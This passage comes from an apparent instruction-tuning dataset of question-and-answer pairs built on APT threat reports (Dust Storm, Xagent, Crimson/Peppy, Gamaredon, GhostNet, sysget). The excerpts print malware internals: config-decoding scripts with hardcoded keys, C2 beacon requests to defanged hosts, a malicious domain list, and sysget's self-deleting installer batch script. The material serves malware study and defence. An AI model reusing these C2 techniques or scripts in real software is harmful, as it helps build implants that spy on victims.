    "instruction": "Context: Medium Headline: DETAILS\nIn a similar way as previous Dust Storm backdoors, this one attempted to detect whether or not the victim was using a Japanese keyboard via the \"GetKeyboardType\" API. The backdoor itself provided the attacker the ability to execute shell commands, enumerate system and network information, manipulate files, and download and execute an arbitrary file. Initial observations suggest this was largely a reconnaissance platform that would then be upgraded by the attacker to a full-featured backdoor.\nThe backdoor performed the initial tests described above by first attempting to add the user \"Lost_{Unique Identifier}\" with the password \"pond~!@ {Unique Identifier}\" to the system using the NetUserAdd API; if successful, it then removed this user via the NetUserDel API. The backdoor then attempted to create the folder \"%System%\\{Unique Identifier}\" with the CreateDirectoryA API and removed it using the RemoveDirectoryA API. Once these two tests were complete, it attempted to access the Windows Service Control Manager through a call to \"OpenSCManagerA\". Once it communicated this information along with proxy and file system info via the initial POST requests, the backdoor attempted to execute a sequence of commands to enumerate information about the system and local network.\n\"net start\" \"Ipconfig /all\" \"net user\" or \"net user /domain\" depending on the value of %USERDNSDOMAIN%\nFigure 20: Initial Commands Executed on the System by the Backdoor\nThe results of these commands are transmitted base64 encoded as the data parameter within the URI, \"/pic/index. asp?id={Unique_Identifier}&type=ie&stype=info&data=\". Once the results of these commands are transmitted back to the C2 server, the backdoor will continue to beacon to the URI \"/pic/index.asp?mmid={Unique Identifier}\" and wait for either commands to execute or an updated binary to download and execute. Any file downloaded from the C2 is sent base64 encoded and has the name \"{Unique Identifier}.txt\". If the file is a binary, it is written to disk as \"tmp.exe\" and executed via WinExec. The backdoor will then communicate back to the C2 with either \"&status=run succeed\" if successful, or \"&status=Error Code\" if there was an error.\nThe \"{Unique Identifier}\" referenced above is an eight-character hex-string calculated by adding the volume serial number of the C drive (or D drive if there is no C) and a CRC32 hash of the first 0x90 bytes of the encoded configuration for the backdoor. This was quite different from the earlier Misdat variants, as it can be reversed to yield the serial number of the drive. The backdoor decodes its configuration information from offset 0xE9FC. It skips the first 4 bytes, then subtracts 0x2 from each byte and XOR's the resultant values with the first byte of the configuration block, 0x58 in this case.\nFigure 21: Encoded Configuration Block\n0000EA00   29 68 74 74 70 3A 2F 2F 73 73 6C 2E 70 72 6F 6A  )hxxp://ssl.proj 0000EA10   65 63 74 73 63 6F 72 70 2E 6E 65 74 2F 70 69 63  ectscorp.net/pic 0000EA20   2F 69 6E 64 65 78 2E 61 73 70 00 00 00 00 00 00  /index.asp...... 0000EA30   00 00 00 00 11 70 69 63 2E 65 6C 65 63 61 72 72  .....pic.elecarr 0000EA40   6F 77 2E 63 6F 6D 00 00 00 00 00 00 00 00 00 00  ow.com..........50 00 BB 01 90 1F 0000EA50   00 00 00 00 50 00 BB 01 90 1F 00 00 00 00 00 00  ....P.\u00bb.\u2022....... 0000EA60   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 0000EA70   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 0000EA80   00 00 00 00 19 15 89 00 00 00 00 00 00 00 00 00  ......\u2030.........\nFigure 22: Decoded Configuration Block\nText strings in the decoded block are each prefaced by their length in hex. In addition to the URL \"hxxp://ssl.projectscorp.net/ pic/index.asp\" and the domain \"pic.elecarrow.com\", the ports that attempt to beacon on 80, 443, and 8080 are highlighted in green, blue, and purple respectively. The following Python function can be used to decode these configuration blocks.\ndef sub_single_byte_xor(buf,subb, key):\nout = ''    for i in buf:\nout += chr((ord(i)-subb) ^ key)    return out\nsub_single_byte_xor(buf,0x2,0x58)\nFigure 23: Python Script to Decode w-Type Configuration Data\nMedium Headline: ZLIB BACKDOOR (2014-2015)\nThis backdoor was the preferred second-stage implant for the group throughout 2014 and 2015. The malware was a full-featured backdoor with built-in NTLM proxy authentication support which was designed to be run as a ServiceDLL. Each sample SPEAR identified was customized to the specific victim environment and programmed using Microsoft Visual C++ 6. As a result, our team has included hashes of samples that were modified to redact victim information. SPEAR has provided as much information as possible so other victims can identify incidents.\nMedium Headline: NETWORK-BASED INDICATORS\nThe backdoor communicates to the preconfigured C2 servers via HTTP POST and GET requests. The contents of the communications are compressed using the standard Zlib compression library (http://www.zlib.net/). During SPEAR's limited testing, the User-Agent was always static and set to \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\".\nPOST /EKTV/index.php?id=0 HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\nHost: bcsr.wordoscorp.com\nAccept: */* Cache-Control: no-cache\nConnection: Keep-Alive\nContent-Length: 498\nPOST /EKTV/index.php?id=3580792616 HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\nHost: bcsr.wordoscorp.com Accept: */*\nCache-Control: no-cache\nConnection: Keep-Alive\nContent-Length: 490\nFigure 25: Initial POST Requests Sent by the Zlib Backdoor\n00000000  1C 12 00 00 1E 12 00 00 FF FF FF FF 40 05 00 00   ........\u00ff\u00ff\u00ff\u00ff@... 00000016  FE CD 18 9C 55 00 53 00 45 00 52 00 2D 00 44 00   \u00fe\u00cd.\u0153U.S.E.R.-.D. 00000032  36 00 39 00 32 00 31 00 46 00 36 00 32 00 31 00   6.9.2.1.F.6.2.1. 00000048  35 00 00 00 DA D2 90 7C DC FF B8 00 20 E9 90 7C   5...\u00da\u00d2\u2022|\u00dc\u00ff\u00b8. \u00e9\u2022| 00000064  68 F6 90 7C FF FF FF FF 61 F6 90 7C EE D4 DD 77   h\u00f6\u2022|\u00ff\u00ff\u00ff\u00ffa\u00f6\u2022|\u00ee\u00d4\u00ddw 00000080  00 00 00 00 E0 CC B8 00 00 00 00 00 F9 D4 DD 77   ....\u00e0\u0338.....\u00f9\u00d4\u00ddw 00000096  00 00 00 00 00 00 00 00 FC 00 00 00 00 00 00 00   ........\u00fc....... 00000112  20 00 00 00 00 00 00 00 9E 7E E5 14 52 55 D1 01  .......\u017e~\u00e5.RU\u00d1. 00000128  00 00 00 00 10 00 00 00 53 00 2D 00 31 00 2D 00   ........S.-.1.-. 00000144  35 00 2D 00 9C B2 B8 00 6E D9 90 7C DC B1 B8 00   5.-.\u0153\u00b2\u00b8.n\u00d9\u2022|\u0731\u00b8. 00000160  98 B1 B8 00 5C F6 90 7C 61 F6 90 7C DC B1 B8 00   \u02dc\u00b1\u00b8.\\\u00f6\u2022|a\u00f6\u2022|\u0731\u00b8. 00000176  6E D9 90 7C 9C B2 B8 00 74 B1 B8 00 7A D9 90 7C   n\u00d9\u2022|\u0153\u00b2\u00b8.t\u00b1\u00b8.z\u00d9\u2022| 00000192  DC FF B8 00 20 E9 90 7C 68 F6 90 7C FF FF FF FF   \u00dc\u00ff\u00b8. \u00e9\u2022|h\u00f6\u2022|\u00ff\u00ff\u00ff\u00ff 00000208  61 F6 90 7C EB 6F DD 77 34 00 00 C0 00 00 00 00   a\u00f6\u2022|\u00ebo\u00ddw4..\u00c0.... 00000224  D4 BA B8 00 F6 6F DD 77 C0 B2 B8 00 00 01 00 00   \u00d4\u00ba\u00b8.\u00f6o\u00ddw\u00c0\u00b2\u00b8..... 00000240  B8 B2 B8 00 B0 B2 B8 00 00 01 00 00 D4 BA B8 00   \u00b8\u00b2\u00b8.\u00b0\u00b2\u00b8.....\u00d4\u00ba\u00b8. 00000256  DC B1 B8 00 00 00 00 00  00 00 00 00 00 00 00 00   \u0731\u00b8............. 00000272  34 00 00 C0 0C B2 B8 00  5C F6 90 7C 61 F6 90 7C   4..\u00c0.\u00b2\u00b8.\\\u00f6\u2022|a\u00f6\u2022| 00000288  00 00 00 00 8C B2 B8 00  2D F6 90 7C E8 B1 B8 00   ....\u0152\u00b2\u00b8.-\u00f6\u2022|\u8c78. 00000304  EC B1 B8 00 54 B2 B8 00  20 E9 90 7C 68 F6 90 7C   \ucc78.T\u00b2\u00b8. \u00e9\u2022|h\u00f6\u2022|\n(con't)\nThe hostname, context the backdoor was running under, operating system information, and user information were transmitted back to the C2 during a controlled test.\nAnswer this question: What was the purpose of the encoded configuration block in the Dust Storm backdoor, and how was it decoded?",
    "output": "The encoded configuration block in the Dust Storm backdoor contained essential information such as the URL of the C2 server and the ports used for communication. The configuration block was encoded starting from offset 0xE9FC, skipping the first 4 bytes, and then subtracting 0x2 from each byte and XOR'ing the resultant values with the first byte of the configuration block, which was 0x58 in this case. The purpose of encoding the configuration block was to obfuscate sensitive information and make it harder for analysts to understand the backdoor's behavior. The provided Python script 'sub_single_byte_xor' could be used to decode these configuration blocks by applying the same XOR operation with the specified key and subtraction value.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nVery Small Headline: Communications Loop\nAs shown in , AgentKernel::run() then enters in an infinite loop relaying communications between the modules and the C&C server:\n\u2022 It fetches ModuleMsg objects from the modules, which are then transmitted to the C&C server by the process previously described for the initial report. For example, the RemoteKeylogger module regularly sends a message containing the captured keystrokes to the C&C server.\n\u2022 It retrieves CryptRawPacket objects sent by the C&C server from a C++ vector dubbed _get_ questions and filled by the ChannelController::getDataFromServer()method. Those objects are decrypted and deserialized into ModuleMsg objects, which are then transmitted to the intended module. For example, the C&C server can send a message with the command START for the RemoteKeylogger module, which then begins its keylogging activity.\n\nHow does the Sednit group's Xagent backdoor handle communication between its modules and the Command and Control (C&C) server? Explain the process in detail.",
    "output": "The Sednit group's Xagent backdoor handles communication between its modules and the C&C server through an infinite loop within the AgentKernel::run() function. This loop performs two primary tasks: First, it fetches ModuleMsg objects from the various modules, such as the RemoteKeylogger module, which captures keystrokes and sends them to the C&C server. Second, it retrieves CryptRawPacket objects sent by the C&C server from a C++ vector called _get_questions, which is populated by the ChannelController::getDataFromServer() method. These packets are then decrypted and deserialized into ModuleMsg objects, which are subsequently transmitted to the appropriate module. For instance, the C&C server can send a command like START to the RemoteKeylogger module, initiating its keylogging activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: USB Module\nIf either the updatu or usbwrm commands are issued, a USB drive module may be downloaded and set to execute on next startup. In the payload that we analyzed, the purpose only appears to search for potentially interesting files in removable storage and copy them to the local disk, likely  so they may be exfiltrated at a later time. This payload may be configured with a set of file extensions (Fig 30) that are used to search for matching files on any USB drives. If any files are found, they are copied to a configured directory on the local disk while a running list of copied files are stored in a separate log so duplicate files are not copied. The anti-duplication method, however, only utilizes filenames so in the event that an already copied file is later modified, a newer copy will not be saved for exflitration. Despite one of the commands that may be used to download this payload may indicate this payload to contain \"worm\" functionality, that does not appear to be the case.\nSmall Headline: Python/Peppy\nPeppy is a Python-based RAT with the majority of its appearances having similarities or definite overlap with MSIL/ Crimson appearances. Peppy communicates to its C&C over HTTP and utilizes SQLite for much of its internal functionality and tracking of exfiltrated files. The primary purpose of Peppy may be the automated exfiltration of potentially interesting files and keylogs. Once Peppy successfully communicates to its C&C, the keylogging and exfiltration of files using configurable search parameters begins (Fig. 30). Files are exfiltrated using HTTP POST requests (Fig. 31).\nIn addition to keylogging and the exfiltration of files, Peppy is also capable of accepting commands from its C&C to update itself, disable itself, exfiltrate a specific file, uninstall itself, execute a shell command, take screenshots, spawn a reverse shell, and download a remote file and execute it.\nIn addition, we have discovered a simple Python-based downloader (md5: 82719f0f6237d3efb9dd67d95f842013) that was possibly written by the author(s) of Peppy based on code overlap between the downloader's functionality and Peppy's download_exec routine (Fig. 32, 33).\nSmall Headline: Conclusion\nAs we described, there are clearly a number of common threads throughout these attacks. We have been able to connect campaigns, vectors, payloads, and, in some cases, infrastructure, but additional details continue to emerge. In the short term, this serves as an important reminder that wars are no longer waged solely on the ground or in the air. Rather, threat actors (whether from nation-states or private parties with interests in international conflicts) will use a variety of cyber tools to achieve their goals.\nRead the text above and answer this question: How does the USB module in the MSIL/Crimson APT handle file duplication when copying files from removable storage, and what potential limitations does this method have?",
    "output": "The USB module in the MSIL/Crimson APT handles file duplication by maintaining a running list of copied files stored in a separate log. This method ensures that duplicate files are not copied. However, the anti-duplication method only utilizes filenames. Therefore, if an already copied file is later modified, a newer copy will not be saved for exfiltration. This limitation means that the system does not account for changes made to files after their initial copy.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Domain Names\nadmin-ru[.]ru adobe.update-service[.]net apploadapp.webhop[.]me brokbridge[.]com cat.gotdns[.]ch check-update[.]ru childrights.in[.]ua conhost.myftp[.]org docdownload.ddns[.]net downloads.email-attachments[.]ru downloads.file-attachments[.]ru dyndownload.serveirc[.]com e.muravej[.]ua\nemail-attachments[.]ru\nfile-attachments[.]ru freefiles.myftp[.]biz getmyfile.webhop[.]me googlefiles.serveftp[.]com grom56.ddns[.]net grom90.ddns[.]net hrome-update[.]ru hrome-updater[.]ru loaderskypetm.webhop[.]me loadsoulip.serveftp[.]com mail.file-attachments[.]ru mails.redirectme[.]net mars-ru[.]ru msrestore[.]ru oficialsite.webhop[.]me parkingdoma.webhop[.]me poligjong.webhop[.]me polistar.ddns[.]net proxy-spread[.]ru rms.admin-ru[.]ru samotsvety.com[.]ua skypeemocache[.]ru skypeupdate[.]ru spbpool.ddns[.]net spread-service[.]ru spread-ss[.]ru spread-updates[.]ru stor.tainfo.com[.]ua tortilla.sytes[.]net ukrnet.serveftp[.]com ukrway.galaktion[.]ru umachka[.]ua update-service[.]net updatesp.ddns[.]net updateviber.sytes[.]net webclidie.webhop[.]me win-restore[.]ru winloaded.sytes[.]net winupdateloader[.]ru www.file-attachments[.]ru www.win-restore[.]ru yfperoliz.webhop[.]me\nAnswer this question: How does the Gamaredon Group leverage domain names to distribute their custom-built malware? Why might this strategy be effective against traditional antimalware technologies?",
    "output": "The Gamaredon Group primarily uses compromised domains, dynamic DNS providers, Russian and Ukrainian country code top-level domains (ccTLDs), and Russian hosting providers to distribute their custom-built malware. This strategy is effective because it allows the group to evade detection by frequently changing the domains used for command and control (C&C) communications. Additionally, the use of legitimate-sounding domain names, such as 'adobe.update-service[.]net' and 'win-restore[.]ru', can trick users into believing they are interacting with legitimate services, thereby increasing the likelihood of successful infection. The modular nature of the malware, its heavy use of batch scripts, and the abuse of legitimate applications and tools further complicate detection by traditional antimalware technologies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: INCIDENT RESPONSE\nOrganizations detecting potential APT activity in their IT or OT networks should:\n1. Immediately isolate affected systems.\n2. Secure backups. Ensure your backup data is offline and secure. If possible, scan your backup data with an antivirus program to ensure it is free of malware.\n3. Collect and review relevant logs, data, and artifacts.\n4. Consider soliciting support from a third-party IT organization to provide subject matter expertise, ensure the actor is eradicated from the network, and avoid residual issues that could enable follow-on exploitation.\n5. Report incidents to and/or the FBI via your or the FBI's 24/7 CyWatch at (855) 292-3937 or .\nNote: for OT assets, organizations should have a resilience plan that addresses how to operate if you lose access to\u2014or control of\u2014the IT and/or OT environment. Refer to the section for more information.\nSee the joint advisory from Australia, Canada, New Zealand, the United Kingdom, and the United States on for guidance on hunting or investigating a network, and for common mistakes in incident handling. CISA, the FBI, and NSA encourage critical infrastructure owners and operators to see CISA's . Although tailored to federal civilian branch agencies, these playbooks provide operational procedures for planning and conducting cybersecurity incident and vulnerability response activities and detail each step for both incident and vulnerability response.\nNote: organizations should document incident response procedures in a cyber incident response plan, which organizations should create and exercise (as noted in the section).\nSmall Headline: Confirm Reporting Processes and Minimize Coverage Gaps\n\u2022 Develop internal contact lists. Assign main points of contact for a suspected incident as well as roles and responsibilities and ensure personnel know how and when to report an incident.\n\u2022 Minimize gaps in IT/OT security personnel availability by identifying surge support for responding to an incident. Malicious cyber actors are when there are gaps in organizational cybersecurity\u2014critical infrastructure organizations should proactively protect themselves by minimizing gaps in coverage.\n\u2022 Ensure IT/OT security personnel monitor key internal security capabilities and can identify anomalous behavior. Flag any identified IOCs and TTPs for immediate response. (See table 1 for commonly observed TTPs).\n\nQuestion: Why is it crucial to immediately isolate affected systems upon detecting potential APT activity in IT or OT networks? Explain the rationale behind this step and its impact on preventing further damage.\n\nAnswer:",
    "output": "Immediately isolating affected systems upon detecting potential APT activity is crucial because it helps contain the threat and prevent it from spreading further within the network. By isolating the affected systems, organizations can limit the attacker's ability to move laterally, exfiltrate data, or cause additional damage. This step is essential for minimizing the overall impact of the incident and ensuring that the rest of the network remains secure while the incident is being investigated and resolved.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: Methodology\nWe compiled a unified and comprehensive list of infected computers from all the control servers, as there was considerable duplication across them. There were several duplicate entries in the list of infected computers\u2014in some cases, the same infected computer was logged multiple times as it was connecting from a different IP address. In other instances, multiple infected computers were assigned different internal IP addresses and had different computer names but shared the same external IP address. This signifies that there were multiple infected computers sharing Internet access. Where possible, we filtered the results by unique computer name, and if no computer name was present, we filtered by unique external IP address.48 (See Fig. 12 - p. 41)\nOn the surface, the names of the infected computers in the sample are provocative. There are references to ministries of foreign affairs, foreign embassies, and other government entities. Some contains names of officials or their positions/titles. However, we recognize that a computer name can be anything its owner wishes, and may be completely unrelated to the location, function, or owner of that particular computer.\nTherefore, in order to be more confident as to the true identity or purpose of the infected computer, we relied on reverse DNS look-ups and each IP address' record from the Regional Internet Registries. Using these two pieces of information we were able to confirm the validity of the identity of several infected computers with a high (H) degree of confidence.\nIn some cases the computer name associated with the infected computer is actually a domain name or an acronym for a recognizable institution or organization. In these cases we classified our identification of the target with either a medium (M) or low (L) level of confidence. Medium confidence refers to instances where we have otherwise identified a related high confidence target,\n48 In one case we removed 117 unique IP addresses from Mexico that appeared to belong to the same computer connecting in to the control server from a DSL provider.\nFig. 12\nThe geographic location of infected hosts.\nThis graphic illustrates the global reach of the GhostNet. There were 1,295 infected computers that reported to the control server. The infections were spread across 103 countries. Taiwan reported the most infections followed by the United States, Vietnam and India.\nbut for which we rely on the computer name for identification. Low confidence refers to instances in which we rely solely on the computer name for identification.\nSmall Headline: Infection timeline\nThe earliest infected computer called home to the control server on May 22, 2007. The most recent entry in our sample is March 12, 2009. On average, the amount of time that a host was actively infected was 145 days.49 While 90 infected computers were only infected for one day, 145 were infected for over 400 days. The longest infection span was 660 days. In total, 422 hosts checked in March 1-12, 2009; 373 of these computers were infected in 2008. The data indicates that despite a reduction in new infections, the network continues to be operational. (See Fig. 13 - p. 45)\nThere are significant spikes in infection rates in December 2007 and August 2008.\nThere were 320 infections in December 2007 spread across 56 countries. However, 113 were located within Taiwan and the majority of these infections occurred within a single organization: the Taiwan External Trade Development Council. During this same period, computers at the Embassies of India in Belgium and Zimbabwe were infected as were the Embassies of Indonesia and the Republic of Korea in the People's Republic of China. In addition, computers at the Ministry of Foreign Affairs in Iran were infected as were several computers at the Tibetan Government-in-Exile.\nThe spike in August 2008 totalled 258 infections spread across 46 countries. The OHHDL computer was infected during one of these spikes in August 2008 (It last checked in to the control server in September 2008). This spike included the Chinese Embassy in the United States,50 3 computers at the Embassy of India in the Unites States, and the High Commission of India in the United Kingdom and in Cyprus. It also included the Embassy of Cyprus in Germany, the Embassy of Malaysia in Cuba, the Embassy of Thailand in the Philippines and the Ministry of Industry in Vietnam. Several companies were also compromised, including Net Trade in Taiwan, the New York Office of Deloitte & Touche, and PetroVietnam, the government-owned oil and gas Company.\n49 The average number of days from the initial infection to the last time an infected computer \"checked in\" with a control server.\n50 It is unclear whether the affected embassy is the Republic of China (Taiwan) or People's Republic of China.\nFig. 13\nGhostNet infection timeline.\nThis screen capture of a timeline generated with Palantir illustrates when and how many computers were infected by the GhostNet. It shows that there are significant spikes in infection rates in December 2007 and August 2008.\nBig Headline: The evidence presented in this report\u2014through a combination of field investigations, interviews, technical scouting, data analysis, mining and visualization\u2014paints a disturbing picture.\nGhostNet represents a network of compromised computers resident in high-value political, economic, and media locations spread across numerous countries worldwide. At the time of writing, these organizations are almost certainly oblivious to the compromised situation in which they find themselves. The computers of diplomats, military attach\u00e9s, private assistants, secretaries to Prime Ministers, journalists and others are under the concealed control of unknown assailant(s).\nIn Dharamsala and elsewhere, we have witnessed machines being profiled and sensitive documents being removed. At our Laboratory, we have analysed our own infected \"honey pot\" computer and discovered that the capabilities of GhostNet are potent and wide ranging. Almost certainly, documents are being removed without the targets' knowledge, keystrokes logged, web cameras are being silently triggered, and audio inputs surreptitiously activated.\nThis raises the question, how many sensitive activities have been preemptively anticipated by intelligence gathered through this network? How many illegal transactions have been facilitated by information harvested through GhostNet? Worst of all, how many people may have been put at risk?\nWhile these questions are compelling, it would be imprudent to read these findings as an indictment, or to attribute to the owners of GhostNet motivations and intentions for which there is no evidence.\nBig Headline: Alternative explanations\nThe list of computers controlled by the GhostNet is significant, and certainly atypical for a cybercrime network. The size of the network is small, and the concentration of high-value systems is significant.\nAt the same time, penetrations of this type are not uncommon. Recently, several large-scale spy nets have been discovered, including ones containing lists of affected computers of a magnitude higher than that harvested by GhostNet.\nThis trend is predictable, converging with accumulating incidents of cyber-attacks facilitated by lower entry-thresholds for computer exploitation methods and technologies. The tools we profile in our investigation, though apparently amassed in a complex way to achieve a definite purpose, are not restricted to an exclusive guild of experts with specialized and confidential knowledge.\nToday, pirated cyber-crime kits circulate extensively on the Internet and can be downloaded by anyone about as easily as the latest pirated DVD.51 Cyberspace has empowered individuals and small groups of non-state actors to do many things, including executing sophisticated computer network operations that were previously only the domain of state intelligence agencies. We have entered the era of do-it-yourself (DIY) signals intelligence.\n51 http://ddanchev.blogspot.com/2008/11/zeus-crimeware-kit-gets-carding-layout.html\nAnswer this question: How did the researchers verify the true identity or purpose of the infected computers in the GhostNet attack, and what levels of confidence were assigned to these identifications?",
    "output": "The researchers verified the true identity or purpose of the infected computers using reverse DNS look-ups and each IP address' record from the Regional Internet Registries. They assigned different levels of confidence based on the information available. High (H) confidence was assigned when both reverse DNS and registry records matched. Medium (M) confidence was assigned when the computer name matched a known institution and there was a related high confidence target. Low (L) confidence was assigned when identification relied solely on the computer name.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Sysget v2 Analysis\nOne of the fundamental changes witnessed in the second iteration of sysget is removing support for Windows XP and lower. Other changes include modifications to the URIs used for network communication.\nLike the original version of sysget, sysget v2 still uses a named event of 'mcsong[]' to ensure a single instance is running at a time. It proceeds to make attempts at copying itself to the %STARTUP%/notilv.exe path. However, it uses COM objects to perform this action that is not available in Windows XP, which prevents the malware from installing itself to this location. While the remainder of the malware operates as expected, it will not survive a restart of the system.\nSysget proceeds to make an attempt at reading the following configuration file. This filename and path has changed since the original version, and is consistent in the subsequent versions.\n%APPDATA%/vklCen5.tmp\nThis configuration file holds both a unique victim identifier, as well as a key that is used to encrypt HTTP traffic. It is\nencrypted using the AES-128 encryption algorithm, using a static key of '734thfg9ih'. Using AES-128 is a change from the previous version, where RC4 was used for all encryption operations. The following Python code may be used to decrypt this file:\n1 import sys\n2 import base64\n3 from wincrypto import CryptCreateHash, CryptHashData, CryptDeriveKey, CryptDecrypt\n4 5 def decrypt(data, original_key):\n6 CALG_AES_128 = 0x660E\n7 CALG_MD5 = 0x8003\n8 md5_hasher = CryptCreateHash(CALG_MD5)\n9 CryptHashData(md5_hasher, original_key)\n10 key = CryptDeriveKey(md5_hasher, CALG_AES_128)\n11 decrypted_data = CryptDecrypt(key, data)\n12 return decrypted_data 13\n14 arg = open(sys.argv[1], 'rb').read()\n15 print repr(decrypt(arg, '734thfg9ih'))\nWhen executed against an example configuration file, we see the following output, which includes the two pieces of data noted previously:\n1 C:\\>python decrypt_config.py vklCen5.tmp\n2 'gh1443717133\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\\n3 x00\\x00\\x00\\x00\\x001059086204\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\\n4 x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\nThe encryption of this configuration file is a new feature that was not present in the original version of sysget.\nIf this file is not present on the system, the malware will attempt to retrieve the necessary information via a HTTP request. The following request is made to the remote command and control server. Note that the full URI is statically set by the malware sample.\n1 GET /index.php?type=read&id=1420efbd80ce02328663631c8d8f813c&pageinfo=jp&lang=\n2 utf-8 HTTP/1.1\n3 Connection: Keep-Alive\n4 User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like\n5 Gecko) Chrome/40.0.2214.115 Safari/537.36\n6 Host: hello.newtaiwan[.]top\nThe server responds with the following data, encrypted using the same technique previously described with a static key of 'aliado75496'. Once decrypted, we see the following example data being sent back to sysget:\ngh1443717133\\n1059086204\\n\nThe first string is used as a key for all subsequent network communication. The second string is treated as a unique victim identifier. This data is encrypted using the key of '734thfg9ih' and written to the %APPDATA%/vklCen5.tmp file.\nAfter this information has been obtained, the malware proceeds to enter its command and control loop. An HTTP request such as the following is made to the remote server. Note that the 'mid' GET variable holds the MD5 hash of the previously obtained victim identifier. The remaining data in the URI is hardcoded.\n1 GET /index.php?type=get&pageinfo=bridge03443&lang=jp&mid=5717cb8fed2750a2ee9e8\n2 30a30716ed4 HTTP/1.1\n3 Connection: Keep-Alive\n4 User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)\n5 Chrome/40.0.2214.115 Safari/537.36\nHost: hello.newtaiwan[.]top\nThe response is encrypted using the unique key that was obtained previously. Should the response contain 'Fatal error' unencrypted, no further actions are taken by the malware sample. Once decrypted, the response may have one of the following two choices, and their accompanying purpose. Alternatively, if a raw command is provided, the malware will execute it and return the results.\nWhen the 'goto wrong' request is made, a HTTP POST request is made to the following URI. In the following URI, the 'list' parameter contains the MD5 hash of the victim's identifier.\n/index.php?type=register&pageinfo=myid32987&list=5717cb8fed2750a2ee9e830a3 0716ed4\nThe contents of this POST request contains the victim's identifier, as well as the file's contents encrypted with the unique key. The first 50 bytes are reserved for the victim identifier, as shown below:\n1 0000016F 35 37 31 37 63 62 38 66 65 64 32 37 35 30 61 32 5717cb8f ed2750a2\n2 0000017F 65 65 39 65 38 33 30 61 33 30 37 31 36 65 64 34 ee9e830a 30716ed4\n3 0000018F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........\n4 0000019F 00 00 4b 59 bc 53 53 99 2b 6f a7 b5 5a 85 c7 66 ..KY.SS. +o..Z..f\nOnce decrypted, the data contains both the filename, as well as the contents of that file.\n1 test.txt\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00[TRUNCATED]\\x\n2 00\\x00\\x00file contents\nIf the 'goto right' command is used, the malware will make a subsequent request to the following URI. The 'cache' variable holds the unique identifier that was provided in the 'goto right' command.\n/index.php?type=goto&pageinfo=myid47386&cache=identifier\nOnce the file contents are obtained, they are written to the specified filename in the %STARTUP% folder.\nWhen a raw command is received, the malware will upload the results to the following URI via a POST request: /index.php?type=register\nAn overview of the network communications exhibited by sysget version 2 can be seen in the figure below.\nBig Headline: Sysget v3 Analysis\nSome of the biggest changes witnessed in version 3 of sysget includes numerous anti-debug and anti-vm detections added, as well as the encryption of the URIs used for network communication.\nWhen the malware initially executes, it performs the following checks to ensure it is not being debugged and not running in a sandbox or virtualized environment.\nShould these checks return false, the malware proceeds to enter its installation routine. The malware originally copies itself to a temp file in the %TEMP% directory with a filename prefix of '00'. It proceeds to append 4194304 bytes of randomly chosen data to the end of this file. The increased filesize may have been added by the author in an attempt to thwart sandboxes that impose filesize limits on what is saved and/or processed. Finally, the malware copies the original file from the tmp path to the %STARTUP%/winlogon.exe path using the same technique witnessed in version 2. Sysget then writes a batch script in the %TEMP% folder with the following contents, cleaning up the original files and spawning the newly written winlogon.exe executable:\n1 @echo off\n2 :t\n3 timeout 1\n4 for /f %%i in ('tasklist /FI \"IMAGENAME eq [original_executable_name]\" ^| find /v /c \"\"' ) do set YO=%%i\n5 if %%YO%%==4 goto :t\n6 del /F \"[original_executable_path]\"\n7 del /F \"[tmp_file]\"\n8 start /B cmd /c \"[startup_winlogon.exe]\"\n9 del /F \"[self]\"\n10 exit\nAfter installation, sysget will attempt to read the same %APPDATA%/vklCen5.tmp file as witnessed in the previous variant. A number of strings within the malware, including the '734thfg9ih' key used to encrypt this file, have been obfuscated via a single-byte XOR of 0x5F.\nSimilar to previous versions, should this vklCen5.tmp file not be present on the victim machine, it will make an external HTTP request to retrieve the necessary information. The following request is made by the malware. Readers will notice that the URI has changed from previous versions in a number of ways. This version of sysget looks to always make requests to 1.php, which is hardcoded within the malware itself. Additionally, all HTTP URIs in this version of sysget are encrypted. The initial GET request made to retrieve the victim identifier and unique key is encrypted with a key of 'Cra%hello-12sW'. The subsequent response containing this information is then decrypted using a key of 'aliado75496', which is consistent with previous versions.\n1 GET\n2 /1.php?K+50lkzq7OtigRtWY7Z5DwkmxRhFd5n3UXyH+Flfa0S8f5h3nl6XBDMa6a3IbDiPQqW\n3 SwZh7lQRmIPLlC8Wmfr8cGv7raGEV160r73FJjnOfyJPLEKWAIyJnfPZhHdGapA6tfwfwj24TN\n4 4QbBrMJkVCLPPZoI4HNtdDEo6G3ujjyvkpWnGQnRBi6DzylNrMypV/K6Ft32dsMmmO52q4IdQ==\n5 HTTP/1.1\n6 Connection: Keep-Alive\n7 User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like\n8 Gecko) Chrome/40.0.2214.115 Safari/537.36\nHost: gtoimage.com\nWhen the URI above is base64-decoded and subsequently decrypted, we see the following:\nindex.php?type=read&id=692fdc3c7b2c310fc017e4af335b8dc8&pageinfo=jp&lang=utf-8\nThis URI is consistent with the previous sysget variant. It would seem the authors simply have added this layer of encryption to hinder efforts to block the malware via network-based detections.\nAfter this initial request to retrieve the victim identifier and unique key, sysget enters its command and control loop. This process is 